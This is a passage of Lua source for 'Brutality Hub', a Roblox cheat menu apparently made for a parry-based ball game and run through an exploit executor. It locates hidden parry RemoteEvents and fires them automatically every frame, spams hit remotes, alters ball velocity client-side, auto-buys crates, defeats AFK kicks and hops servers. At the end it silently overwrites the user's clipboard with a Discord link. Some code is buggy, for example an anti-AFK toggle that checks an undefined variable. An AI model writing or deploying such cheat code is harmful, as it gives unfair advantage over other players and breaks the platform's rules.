                    [2] = math.random(100, 200)
                },
                [5] = false
            }
            hitremote:FireServer(unpack(args))
        end
    end

    heartbeatConnection = RunService.Heartbeat:Connect(function()
        if enabled then
            fireHitRemote()
        end
    end)

    table.insert(manspamcons, RunService.PreRender:Connect(function()
        if enabled then
            fireHitRemote()
        end
    end))

    enabled = true

    button.Text = "ON"
    button.TextColor3 = Color3.new(0, 1, 0)
end

local function toggleClashMode()
    activated = not activated

    if activated then
        activateClashMode()
    else
        deactivateClashMode()
    end
end

button.MouseButton1Click:Connect(toggleClashMode)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.G then
        toggleClashMode()
    end
end)

local Toggle3 = Tab3:AddToggle({
    Name = "Manual Spam",
    Description = "Enables manual spam functionality.",
    Default = false,
    Callback = function(state)
        if state then
            gui.Enabled = true
            if activated then
                activateClashMode()
            else
                deactivateClashMode()
            end
        else
            deactivateClashMode()
            gui.Enabled = false
        end
    end
})

local Section = Tab3:AddSection({"Combat Modes"})

local Dropdown = Tab3:AddDropdown({
    Name = "Combat Modes",
    Description = "Select a combat mode.",
    Options = {"Basic", "Basic High", "Medium", "Medium High", "Pro", "Pro High", "Extreme", "Extreme [AI]"},
    Default = "Extreme [AI]",
    Flag = "Brutality Hub",
    Callback = function(currentOption)
        if autoParryAIEnabled then
            local Notify = Library:MakeNotify({
                Title = "Brutality Hub ",
                Text = "Brutality Hub  has applied the mode " .. currentOption .. " automatically successfully.",
                Time = 5
              })
        else
            local Notify = Library:MakeNotify({
                Title = "Brutality Hub",
                Text = "Brutality Hub  cannot activate mode " .. currentOption .. " since you do not have Auto Parry [AI] mode activated.",
                Time = 5
              })
        end
    end
})

local Section = Tab3:AddSection({"Other Combat Options"})

local Toggle1 = Tab3:AddToggle({
    Name = "Anti Curve",
    Description = "Enables or disables anti-curve feature.",
    Default = false,
    Callback = function(toggled)
        getgenv().antiCurveEnabled = toggled
    end
})

local RunService = game:GetService('RunService')

local function preventCurve(ball)
    local previousPosition = ball.Position
    RunService.Heartbeat:Connect(function()
        if getgenv().antiCurveEnabled then
            local currentPosition = ball.Position
            local velocity = ball.Velocity

            if (currentPosition - previousPosition).Magnitude > 0.1 and velocity.Magnitude > 0 then
                ball.Velocity = (currentPosition - previousPosition).Unit * velocity.Magnitude
            end

            previousPosition = currentPosition
        end
    end)
end

local function onBallAdded(ball)
    if ball:IsA("BasePart") and ball.Name == "Ball" then
        preventCurve(ball)
    end
end

workspace:WaitForChild("Balls").ChildAdded:Connect(onBallAdded)

for _, ball in ipairs(workspace:WaitForChild("Balls"):GetChildren()) do
    onBallAdded(ball)
end

local ReplicatedStorage = game:GetService('ReplicatedStorage')
local RunService = game:GetService('RunService')
local Players = game:GetService('Players')
local Stats = game:GetService('Stats')

local local_player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local parry_remote = nil

local Services = {
    game:GetService('AdService'),
    game:GetService('SocialService')
}

function resolve_parry_Remote()
    for _, value in pairs(Services) do
        local temp_remote = value:FindFirstChildOfClass('RemoteEvent')
        if not temp_remote then
            continue
        end
        if not temp_remote.Name:find('\n') then
            continue
        end
        parry_remote = temp_remote
    end
end

resolve_parry_Remote()

local aura_table = {
    canParry = true,
    parry_Range = 0,
    hit_Time = tick()
}

local function get_closest_entity(Object)
    local closest_Entity = nil
    local max_distance = math.huge
    for _, entity in ipairs(workspace.Alive:GetChildren()) do
        if entity.Name ~= Players.LocalPlayer.Name then
            local distance = (Object.Position - entity.HumanoidRootPart.Position).Magnitude
            if distance < max_distance then
                closest_Entity = entity
                max_distance = distance
            end
        end
    end
    return closest_Entity
end

local function enableUltraFastBlocking(enable)
    if enable then
        RunService.Heartbeat:Connect(function()
            if not aura_table.canParry then
                return
            end

            local closest_Entity = get_closest_entity(local_player.Character.PrimaryPart)
            if closest_Entity then
                local target_Position = closest_Entity.HumanoidRootPart.Position
                local ball = workspace:FindFirstChild("Ball")

                if ball then
                    local player_Position = local_player.Character.PrimaryPart.Position
                    local ball_Position = ball.Position
                    local ball_Distance = (player_Position - ball_Position).Magnitude
                    local ping = Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 10

                    aura_table.parry_Range = math.max(math.max(ping, 2), 4.5)

                    if ball_Distance <= aura_table.parry_Range then
                        parry_remote:FireServer(
                            0.5,
                            CFrame.new(camera.CFrame.Position, Vector3.new(math.random(0, 100), math.random(0, 1000), math.random(100, 1000))),
                            {[closest_Entity.Name] = target_Position},
                            {target_Position.X, target_Position.Y},
                            false
                        )

                        aura_table.canParry = false
                        aura_table.hit_Time = tick()

                        task.delay(0.01, function()
                            aura_table.canParry = true
                        end)
                    end
                end
            end
        end)
    else
        aura_table.canParry = false
    end
end

local Toggle2 = Tab3:AddToggle({
    Name = "Ultra Fast Block",
    Description = "Enables or disables ultra-fast block.",
    Default = false,
    Callback = function(toggled)
        enableUltraFastBlocking(toggled)
    end
})

local Section = Tab3:AddSection({"Other Options"})

local Toggle1 = Tab3:AddToggle({
    Name = "DC-15X Sound For Your Sword",
    Description = "Replaces your sword's sound with the DC-15X blaster sound.",
    Default = false,
    Callback = function(toggled)
        getgenv().hit_sound_Enabled = toggled
    end
})

local Toggle2 = Tab3:AddToggle({
    Name = "Follow Ball",
    Description = "Automatically follows the ball in specific game modes.",
    Default = false,
    Callback = function(state)
        getgenv().FB = state
    end
})

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local detectToggle = false
local detectionCooldowns = {}

local function createNotification(player, deviceType)
    local Notify = Library:MakeNotify({
        Title = "Brutality Hub",
        Text = "Brutality Hub  detected a rapid click on " .. player.Name .. "'s " .. deviceType,
        Time = 5
    })
end

local Toggle4 = Tab3:AddToggle({
    Name = "Detect Auto Clicker Manual Spam Auto Parry",
    Description = "Detects auto clickers and enables manual spam and auto parry.",
    Default = false,
    Callback = function(state)
        detectToggle = state
    end
})

local localPlayer = Players.LocalPlayer
local inputCounts = {}

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not detectToggle then return end
    if gameProcessed then return end

    local inputType = input.UserInputType
    local keyCode = input.KeyCode

    if inputType == Enum.UserInputType.Keyboard and keyCode == Enum.KeyCode.F or 
       inputType == Enum.UserInputType.Touch then
       
        local deviceType = inputType == Enum.UserInputType.Keyboard and "F key" or "screen"
        local now = tick()
        local player = localPlayer
        local userId = player.UserId

        if not inputCounts[userId] then
            inputCounts[userId] = {count = 0, lastTime = now}
        end
        
        local inputData = inputCounts[userId]
        inputData.count = inputData.count + 1

        if (now - inputData.lastTime) > 1 then
            inputData.count = 1
            inputData.lastTime = now
        end

        if inputData.count >= 100 then
            if detectionCooldowns[userId] and (now - detectionCooldowns[userId] < 22) then
                return
            end

            if player ~= localPlayer then
                createNotification(player, deviceType)
            end
            
            detectionCooldowns[userId] = now
            inputData.count = 0
        end
    end
end)

local Section = Tab4:AddSection({"Shop"})

Tab4:AddButton({
    Name = "Buy Sword Box",
    Description = "Purchases a sword box for 80 coins.",
    Callback = function()
        game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalSwordCrate)
    end
})

Tab4:AddButton({
    Name = "Buy Explosion Box",
    Description = "Purchases an explosion box for 80 coins.",
    Callback = function()
        game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalExplosionCrate)
    end
})

local Section = Tab4:AddSection({"Auto Shop"})

Tab4:AddToggle({
    Name = "Auto Buy Sword Box",
    Description = "Automatically buys sword boxes when possible.",
    Default = false,
    Callback = function(state)
        getgenv().ASC = state
    end
})

Tab4:AddToggle({
    Name = "Auto Buy Explosion Box",
    Description = "Automatically buys explosion boxes when possible.",
    Default = false,
    Callback = function(state)
        getgenv().AEC = state
    end
})

local Section = Tab77:AddSection({"Music"})

local MusicId = nil
local MusicToggle = false
local currentSound = nil
local pausedPosition = 0

local function playMusic()
    if MusicToggle and MusicId then
        if currentSound then
            currentSound:Stop()
            currentSound:Destroy()
        end
        currentSound = Instance.new("Sound", game.Workspace)
        currentSound.SoundId = "rbxassetid://" .. MusicId
        currentSound.TimePosition = pausedPosition
        currentSound.Looped = true
        currentSound:Play()
        currentSound.Ended:Connect(function()
            currentSound.TimePosition = 0
            currentSound:Play()
        end)
    end
end

Tab77:AddTextBox({
    Name = "Music ID",
    Description = "Enter the ID of the music track you want to play.",
    Default = "",
    Callback = function(value)
        MusicId = value
        playMusic()
    end
})

local Section = Tab77:AddSection({"Play Music Modes"})

local Toggle1 = Tab77:AddToggle({
    Name = "Play Music",
    Description = "Enables or disables music playback.",
    Default = false,
    Callback = function(state)
        MusicToggle = state
        if MusicToggle then
            playMusic()
        else
            if currentSound then
                pausedPosition = currentSound.TimePosition
                currentSound:Stop()
            end
        end
    end
})

Tab77:AddButton({
    Name = "Repeat Music",
    Description = "Enables or disables music repetition.",
    Callback = function()
        if MusicToggle and currentSound then
            currentSound.TimePosition = 0
            currentSound:Play()
        end
    end
})

local Section = Tab77:AddSection({"Music Recommended"})

Tab77:AddButton({
    Name = "Phonk",
    Description = "Plays a Phonk music track.",
    Callback = function()
        MusicId = "16190782181"
        playMusic()
    end
})

Tab77:AddButton({
    Name = "Copy ID Music Phonk",
    Description = "Copies the ID of the Phonk music track to the clipboard.",
    Callback = function()
        setclipboard("16190782181")
    end
})

local Section = Tab5:AddSection({"Client"})

Tab5:AddButton({
    Name = "Anti Lag",
    Description = "Reduces game lag.",
    Callback = function()
        local Terrain = workspace.Terrain
        local Lighting = game:GetService("Lighting")
        Terrain.WaterWaveSize = 0
        Terrain.WaterWaveSpeed = 0
        Terrain.WaterReflectance = 0
        Terrain.WaterTransparency = 0
        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 0
        
        for _, child in pairs(workspace:GetDescendants()) do
            if child:IsA("BasePart") and child.Name ~= "Terrain" then
                child.Material = Enum.Material.Plastic
                child.Reflectance = 0
            elseif child:IsA("Decal") or child:IsA("Texture") then
                child:Destroy()
            elseif child:IsA("ParticleEmitter") or child:IsA("Fire") or child:IsA("Smoke") then
                child.Enabled = false
            elseif child:IsA("Explosion") then
                child.Visible = false
            end
        end
    end
})

local Toggle1 = Tab5:AddToggle({
    Name = "View FPS And Ping",
    Description = "Displays current FPS and ping values.",
    Default = false,
    Callback = function(state)
        if state then
            local Ping = Instance.new("ScreenGui")
            Ping.Name = "Ping"
            Ping.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            Ping.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            Ping.ResetOnSpawn = false

            local Pingtext = Instance.new("TextLabel")
            Pingtext.Name = "Pingtext"
            Pingtext.Parent = Ping
            Pingtext.BackgroundTransparency = 1

            local initialPingPositionPC = UDim2.new(1, -230, 0, 0)
            local initialFPSPositionPC = UDim2.new(1, -120, 0, 0)

            local initialPingPositionMobile = UDim2.new(1, -230, 1, -353)
            local initialFPSPositionMobile = UDim2.new(1, -120, 1, -353)

            local initialPingPosition = initialPingPositionPC
            local initialFPSPosition = initialFPSPositionPC

            Pingtext.Position = initialPingPosition
            Pingtext.Size = UDim2.new(0, 120, 0, 25)
            Pingtext.Font = Enum.Font.SourceSans
            Pingtext.Text = "Ping: "
            Pingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
            Pingtext.TextStrokeTransparency = 0.5
            Pingtext.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            Pingtext.TextScaled = true
            Pingtext.TextSize = 14.000
            Pingtext.TextWrapped = true

            local RunService = game:GetService("RunService")
            local UserInputService = game:GetService("UserInputService")

            local lastPing = -1
            local function updatePing()
                while true do
                    wait(0.1)
                    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
                    local roundedPing = math.floor(ping + 0.5)
                    if roundedPing ~= lastPing then
                        Pingtext.Text = "Ping: " .. roundedPing .. " (40%CV)"
                        if roundedPing > 250 then
                            Pingtext.TextColor3 = Color3.fromRGB(255, 0, 0)
                        else
                            Pingtext.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end
                        lastPing = roundedPing
                    end
                end
            end

            spawn(updatePing)

            local TextLabel = Instance.new("TextLabel")
            TextLabel.Name = "FPSLabel"
            TextLabel.Parent = Ping
            TextLabel.BackgroundTransparency = 1

            TextLabel.Position = initialFPSPosition
            TextLabel.Size = UDim2.new(0, 45, 0, 25)
            TextLabel.Font = Enum.Font.SourceSans
            TextLabel.Text = "FPS: "
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextStrokeTransparency = 0.5
            TextLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 18.000
            TextLabel.TextWrapped = true

            local function FormatFPS(fps)
                return "FPS: " .. math.floor(fps + 0.5)
            end

            local fpsSamples = {}
            local sampleDuration = 0.1
            local lastFPS = -1

            RunService.RenderStepped:Connect(function()
                table.insert(fpsSamples, tick())
                if #fpsSamples > 60 then
                    table.remove(fpsSamples, 1)
                end
            end)

            local function updateFPS()
                while true do
                    wait(sampleDuration)
                    local now = tick()
                    local count = 0
                    local totalTime = 0

                    for i = 1, #fpsSamples - 1 do
                        if fpsSamples[i + 1] then
                            totalTime = totalTime + (fpsSamples[i + 1] - fpsSamples[i])
                            count = count + 1
                        end
                    end

                    local fps = count / totalTime
                    if fps ~= lastFPS then
                        TextLabel.Text = FormatFPS(fps)

                        if fps < 30 then
                            TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                        else
                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                        end

                        lastFPS = fps
                    end
                end
            end

            spawn(updateFPS)

            local function updatePositions(isMobile)
                if isMobile then
                    initialPingPosition = initialPingPositionMobile
                    initialFPSPosition = initialFPSPositionMobile
                else
                    initialPingPosition = initialPingPositionPC
                    initialFPSPosition = initialFPSPositionPC
                end
            end

            UserInputService.InputChanged:Connect(function()
                local isMobile = UserInputService.TouchEnabled
                updatePositions(isMobile)
                Pingtext.Position = initialPingPosition
                TextLabel.Position = initialFPSPosition
            end)
        else
            local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
            if playerGui then
                local pingGui = playerGui:FindFirstChild("Ping")
                if pingGui then
                    pingGui:Destroy()
                end
            end
        end
    end
})

Tab5:AddButton({
    Name = "Reset",
    Description = "Resets game settings.",
    Callback = function()
        game.Players.LocalPlayer.Character.Head:Destroy()
        if game.Players.LocalPlayer.Character.Humanoid.Health < 5 then 
            local deathmanok = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
            wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(deathmanok)
        end
    end
})

local Toggle2 = Tab5:AddToggle({
    Name = "Anti Afk",
    Description = "Prevents automatic disconnection due to inactivity.",
    Default = false,
    Callback = function(Value)
        if state then
            local VirtualUser = game:GetService("VirtualUser")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            
            LocalPlayer.Idled:Connect(function()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        else
            local VirtualUser = game:GetService("VirtualUser")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            
            LocalPlayer.Idled:Connect(function()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end
    end
})

local Section = Tab5:AddSection({"FPS Unloker"})

Tab5:AddSlider({
    Name = "FPS Unlocker",
    Description = "Adjusts maximum FPS.",
    Min = 144,
    Max = 1000,
    Increase = 1,
    Default = 1000,
    Callback = function(Value)
        setfpscap(Value)
    end
})

local Toggle3 = Tab5:AddToggle({
    Name = "Enable FPS",
    Description = "Enables or disables FPS unlocker.",
    Default = true,
    Callback = function(state)
        if state then
            setfpscap(10000000)
        else
            setfpscap(144)
        end
    end
})

local Section = Tab5:AddSection({"Server"})

Tab5:AddButton({
    Name = "Serverhop",
    Description = "Changes to a different game server.",
    Callback = function()
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        local File = pcall(function()
            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
        end)
        if not File then
            table.insert(AllIDs, actualHour)
            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
        end
        function TPReturner()
            local Site;
            if foundAnything == "" then
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
            else
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
            end
            local ID = ""
            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
                foundAnything = Site.nextPageCursor
            end
            local num = 0;
            for i,v in pairs(Site.data) do
                local Possible = true
                ID = tostring(v.id)
                if tonumber(v.maxPlayers) > tonumber(v.playing) then
                    for _,Existing in pairs(AllIDs) do
                        if num ~= 0 then
                            if ID == tostring(Existing) then
                                Possible = false
                            end
                        else
                            if tonumber(actualHour) ~= tonumber(Existing) then
                                local delFile = pcall(function()
                                    delfile("NotSameServers.json")
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end)
                            end
                        end
                        num = num + 1
                    end
                    if Possible == true then
                        table.insert(AllIDs, ID)
                        wait()
                        pcall(function()
                            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                        end)
                        wait(4)
                    end
                end
            end
        end
        
        function Teleport()
            while wait() do
                pcall(function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end)
            end
        end
        Teleport()
    end
})

Tab5:AddButton({
    Name = "Rejoin",
    Description = "Rejoins the current game server.",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})

Tab5:AddButton({
    Name = "Exit Game",
    Description = "Exits the game.",
    Callback = function()
        game:Shutdown()
    end
})

local Section = Tab5:AddSection({"Other Options"})

Tab5:AddButton({
    Name = "Open Console",
    Description = "Opens the game console.",
    Callback = function()
        game.StarterGui:SetCore("DevConsoleVisible", true)
        wait()
    end
})

setclipboard("https://discord.gg/brutality-hub-1182005198206545941")
